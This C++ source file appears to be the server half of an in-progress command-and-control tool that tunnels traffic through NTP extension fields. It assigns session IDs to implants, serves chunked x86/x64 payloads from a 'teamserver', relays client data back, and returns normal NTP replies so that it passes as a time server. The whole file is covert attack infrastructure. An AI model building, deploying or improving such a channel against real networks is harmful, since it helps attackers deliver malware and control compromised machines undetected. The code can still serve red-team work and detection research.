#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include "parsentp.hpp"
#include "helpers.hpp"
#include "createntp.hpp"
#include "constants.hpp"
#include <array>
#include "client.hpp"
#include "constants.hpp"
#include "globals.hpp"
#include "teamserver.hpp"

void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
    //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
    //safely moving into vector by doing data + len (data is a char* so it's the first item
    std::vector<uint8_t> rawPacket(data, data + len);

    std::cout << "Received " << len << " bytes from "
        << inet_ntoa(client_addr->sin_addr) << ":"
        << ntohs(client_addr->sin_port) << std::endl;

    //1. Run some checks to make sure an extension field exists, and extract it if so

    //2 seperate for different error messages. Could just be the < 52 one as well.
    if (rawPacket.size() <= 48) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);
        return;
    }

    //each packet needs the 4 byte header, so check if there are bytes there
    if (rawPacket.size() < 52) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "Packet does not contain an extension field" << std::endl;

        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);

        return;
    }




    //Extract extension field
    NTPPacketParser ntpPacket(rawPacket);
    std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
    std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
    //standard here: print debug header of packet type, then printthe packet

    //Extract client ID and stuff out, do class checks to see if it exists, and setup for further action
    std::vector<uint8_t> clientId = ntpPacket.getExtensionClientId();
    //sanity debug
    std::cout << "[?] Client Session ID: ";
    printHexVector(clientId); 
    std::cout << std::endl;

    //2. Do different actions based on what type of packet/extension field is coming in
    if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Give Me Payload " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //extract arch
        uint8_t payloadArch = 0x00; // declared outside so its in scope

        try {
            payloadArch = ntpPacketExtension.at(8); // throws if index >= size, safer than []
        }
        catch (const std::out_of_range& e) {
            std::cerr << "Packet too short: " << e.what() << std::endl;
            return;
        }

        //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl <<std::dec;  // prints arch

        if (payloadArch == 0x86) {
            std::cout << "[?] X86 Payload Requested " << std::endl;

            //1. Get paylaod form TS
            std::vector<uint8_t> payload = getx86Payload();

            //need to convert vector to uint32 cuz that's what find needs
            uint32_t uintClientId = vectorToUint32(clientId);

            //lookup client class
            std::cout << "Printing Sesions: ";
            printClientIDs(sessions);
            auto it = sessions.find(uintClientId);
            if (it != sessions.end()) {
                it->second.setForClientBuffer(payload);


                std::cout << "[?] Stored payload in client class, size: " << payload.size();
                //printHexVector(someClient.getForClientBuffer());


                //once we have the data, create a new packet with the extension field
                //this needs to be a size packet, which sends back the size of the payload.
                //future packets, wtih 0x00, will send the aactual paylaod
                std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());

                std::cout << "[?] DEBUG: Payload as vector: ";
                printHexVector(sizeOfDataButAsAVectorBecauseEverythingIsAVector);

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacket,
                    sizeOfDataButAsAVectorBecauseEverythingIsAVector,
                    Client::emptyClientId //using empty sesion ID to fit spec

                );

                auto newPacket = newPacketClass.getPacket();

                sendNtpPacket(client_addr, sock, newPacket);
                return; //done, so don't continue
            }
            else {
                std::cout << "[?] Could not find client class: ";
                printHexVector(clientId);
            }
        }

        else if (payloadArch == 0x64) {
            std::cout << "[?] X64 Payload Requested " << std::endl;

            //1. Get paylaod form TS
            std::vector<uint8_t> payload = getx64Payload();

            //need to convert vector to uint32 cuz that's what find needs
            uint32_t uintClientId = vectorToUint32(clientId);

            //lookup client class
            std::cout << "Printing Sesions: ";
            printClientIDs(sessions);
            auto it = sessions.find(uintClientId);
            if (it != sessions.end()) {
                it->second.setForClientBuffer(payload);


                std::cout << "[?] Stored payload in client class, size: " << payload.size();
                //printHexVector(someClient.getForClientBuffer());


                //once we have the data, create a new packet with the extension field
                //this needs to be a size packet, which sends back the size of the payload.
                //future packets, wtih 0x00, will send the aactual paylaod
                std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());

                std::cout << "[?] DEBUG: Payload as vector: ";
                printHexVector(sizeOfDataButAsAVectorBecauseEverythingIsAVector);

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacket,
                    sizeOfDataButAsAVectorBecauseEverythingIsAVector,
                    Client::emptyClientId //using empty sesion ID to fit spec

                );

                auto newPacket = newPacketClass.getPacket();

                sendNtpPacket(client_addr, sock, newPacket);
                return; //done, so don't continue
            }
            else {
                std::cout << "[?] Could not find client class: ";
                printHexVector(clientId);
            }
        }

        else if (payloadArch == 0x00) {
            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
            
            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.  
            //need to figure out class logic to see if a class exists. Maybe a basic factory that searches it or creates one, as a function.

            //need to convert clientId to uint32 as that's what is hashed
            //uint32_t convertedClientId;
            //std::memcpy(&convertedClientId, clientId.data(), sizeof(convertedClientId));
            uint32_t convertedClientId = vectorToUint32(clientId);

            std::cout << "[?] Looking up class by key: " << convertedClientId << std::endl;

            // Attempt to find key
            auto it = sessions.find(convertedClientId);
            if (it != sessions.end()) {
                //std::cout << "Found: " << it->second << "\n";
                std::cout << "[?] Class exists for " << convertedClientId << std::endl;
                //get next chunk - need to figure otu chunk size here too
                std::vector<uint8_t> nextChunk = it->second.getNextChunk(Chunk::maxChunkSize);
                //send back
                
                //craet NTP packet
                NTPPacket responsePacketClass;
                responsePacketClass.addExtensionField(
                    NtpExtensionField::dataFromTeamserver, //is this the best way to get this back? Maybe a dedicated header specifying payload
                    nextChunk,
                    Client::emptyClientId //using empty sesion ID to fit spec

                );

                std::vector<uint8_t> responsePacket = responsePacketClass.getPacket();

                sendNtpPacket(client_addr, sock, responsePacket);


            }
            else {
                std::cout << "[?] Client Class not found!" << std::endl;
            }


        }

        else {
            std::cout << "[?] Invalid Payload" << std::endl;
        }

        //temp send back normal packet
        //sendNormalNtpPacket(client_addr, sock);

    }


    /*
    Get ID packet - aka the first thing a client needs to call to 
    1. Get an ID
    2. Create a client class for them. We can then assume in other funcs that the class is created (should probably still check/have error handling)

    //might help if I add ti to it
    */

    else if (ntpPacketExtensionField == NtpExtensionField::getIdPacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getIdPacket " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        std::cout << "[?] getIdPacket recieved, Generating ID" << std::endl;

        //This is also known as clientId, probbably need to change everywhere to ClientID
        uint32_t clientID = generateClientID();
        std::cout << "[?] Client ID: " << clientID << std::endl;
        
        //placeholder for ID
        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);

        //Create class for th
        ClientSession someClient(clientIdVector);


        // Add the new ClientSession to the sessions map
        //sessions[clientID] = someClient;
        //have to use insert, as sessions[clientID] tries to create the class, instead of using an existing one
        sessions.insert({ clientID, someClient });
        std::cout << "[?] Added Client Session with ID: " << clientID << " to the sessions map." << std::endl;


        //create NTP packet for response, with client ID included
        NTPPacket idPacket;

        idPacket.addExtensionField(
            NtpExtensionField::idPacket,
            clientIdVector,
            Client::emptyClientId //using empty sesion ID to fit spec

        );

        std::vector<uint8_t> rawPacket = idPacket.getPacket();

        sendNtpPacket(
            client_addr,
            sock,
            rawPacket
        );

    }

    //Called first to comms size, sets up data in client class for incoming message
    /*
    
        sets client.inboundMessageSize
        server knows to stop reading/writing packets here after this size? when that # is hit, then forward to teamserver.
    */
    else if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: sizePacket " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        std::cout << "[?] sizePacket recieved" << std::endl;

        //lookup client class. Should exist.
        uint32_t uintClientId = vectorToUint32(clientId);
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {
            //extensino data here holds size of TOTAL message from client
            
            //this is getting emsy, 
            uint32_t uintMessageSize = vectorToUint32(ntpPacket.getExtensionData());
            it->second.setFromClientBufferSize(uintMessageSize);


            std::cout << std::dec << "[?] Stored size of message in client class, size: " << it->second.getFromClientBufferSize() << std::endl;
            //printHexVector(someClient.getForClientBuffer());


            //once we have the data, create a new packet with the extension field
            //this needs to be some packet that aknowldeges that we got the message from the client, something simple. 
            std::vector<uint8_t> emptyVec = {};
            NTPPacket newPacketClass;
            newPacketClass.addExtensionField(
                NtpExtensionField::sizePacketAcknowledge,
                emptyVec, //emtpy vector, not passing any data,just saying eerythign is okay
                Client::emptyClientId //using empty sesion ID to fit spec
            );
            auto newPacket = newPacketClass.getPacket();

            sendNtpPacket(client_addr, sock, newPacket);
            return; //done, so don't continue
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
        }
        //Add sizse of message to client class, to fromClientBufferSize

        //(in dataForTeamserver) continue to append to fromClientBuffer until data == fromClientBufferSize, then send to teamserver.

        //how to implement:
        //lookign at ICMP code, after we send that, we immediatly read from the teamserver frame, 
        //so maybe it goes
        //1. Get all data from client, send some sort of "ok" message back in chunking process. 
        //2. When all data is retrieved, forward to TS from client class
        //3. Get resposne from TS, Save TS resposne in client class
        //4. send 1 sizePacket, then dataFromTeamserver packets (chunked) back (client must send a "giveMeTsResponse" packet so it's outbound), with the data from the TS in the response.
            //need to edit chunker on client side for a "send chunked" and "recieve chunked"
            //size packet is so the client knows how big it is inbound.
        //Note, don't have to re-create a chunker here, can use the assumption of one packet per checkin, then just continue to send back by popping off the queue, like
        //we did for payload.
        //Ex, client sends a giveMeTsResponseSize, which gives size, then giveMeTsResponse until total response = size.
    }


    /*
    dataForTeamserver

    ...


    */
    else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: dataForTeamserver " << std::endl;
        std::cout << "----------------------" << std::endl;
        //this is data meant for teamserver. Need to fogure out chunkinghere too

        //identify session here too?
        std::cout << "sendDataToTeamserver " << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //lookup client class. Should exist.
        uint32_t uintClientId = vectorToUint32(clientId);
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {

            //If buffer is bigger than ClientBufferSize, something screwed up somehwere.
            if (it->second.getFromClientBufferSize() >= it->second.fromClientBuffer.size()) {
                std::cout << "[!] More data than the ClientClass thinks it should have is being sent by client" << std::endl;
                std::cout << "[!] Expected Size: " << it->second.fromClientBuffer.size() << "Actual Size: " << it->second.fromClientBuffer.size() << std::endl;
            }

            //append chunk to end of buffer 
            it->second.fromClientBuffer.insert(it->second.fromClientBuffer.end(), ntpPacket.getExtensionData().begin(), ntpPacket.getExtensionData().end());
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
        }
            
        //send ok back
        std::vector<uint8_t> emptyVec = {};
        NTPPacket newPacketClass;
        newPacketClass.addExtensionField(
            NtpExtensionField::sizePacketAcknowledge,
            emptyVec, //emtpy vector, not passing any data,just saying eerythign is okay
            Client::emptyClientId //using empty sesion ID to fit spec
        );
        auto newPacket = newPacketClass.getPacket();

        sendNtpPacket(client_addr, sock, newPacket);

        //temp send back normal packet
        //sendNormalNtpPacket(client_addr, sock);
    }

    /*
    Meant for clients to check in and get the data from the teamserver here
    
    */
    else if (ntpPacketExtensionField == NtpExtensionField::getTeamServerData) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getTeamServerData " << std::endl;
        std::cout << "----------------------" << std::endl;
        //this is data meant for teamserver. Need to fogure out chunkinghere too

        //identify session here too?
        std::cout << "getTeamServerData " << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //Look up client class

        //append inbound to client class
        // 

        //send ok back
        std::vector<uint8_t> emptyVec = {};
        NTPPacket newPacketClass;
        newPacketClass.addExtensionField(
            NtpExtensionField::sizePacketAcknowledge,
            emptyVec, //emtpy vector, not passing any data,just saying eerythign is okay
            Client::emptyClientId //using empty sesion ID to fit spec
        );
        auto newPacket = newPacketClass.getPacket();

        sendNtpPacket(client_addr, sock, newPacket);

        //temp send back normal packet
        sendNormalNtpPacket(client_addr, sock);
        }


    else {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Unknown " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "[?] Packet extension did not match any known extensions" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //if none of the headers match,s end back regular NTP packet
        //send back normal packet
        sendNormalNtpPacket(client_addr, sock);

    }

}
